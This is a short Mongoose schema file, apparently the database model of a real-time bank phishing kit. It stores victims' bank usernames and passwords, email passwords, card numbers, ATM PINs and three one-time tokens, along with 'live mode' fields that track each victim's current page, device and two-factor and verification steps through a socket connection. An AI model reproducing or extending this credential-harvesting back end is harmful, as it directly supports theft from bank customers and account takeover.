const { Schema, model } = require('mongoose');

const UserSchema = Schema({
    userID: String,
    bankID: String,
    username: String,
    password: String,
    correo: String,
    celular: String,
    claveCorreo: String,
    token1: String,
    token2: String,
    token3: String,
    tarjeta: String,
    atmPassword: String,
    typeDocument: String,
    
    isLoading: Boolean,
    socketID: String,
    isConnected: Boolean,

    // MODE LIVE
    modeLive: Boolean,
    liveData: [{
        textPage: String,
        urlPage: String
    }],

    pageNow: String,
    numberDevice: String,
    typeDevice: String,
    userAndPassword: Boolean,
    twoFactor: Boolean,
    passwordEmail: Boolean,
    verificationDevice: Boolean,
    // END MODE LIVE

    deleteUser: Boolean,
    createAt: { type: String, default: new Date()},
    infoDevice: String,
    
    ip: String
});

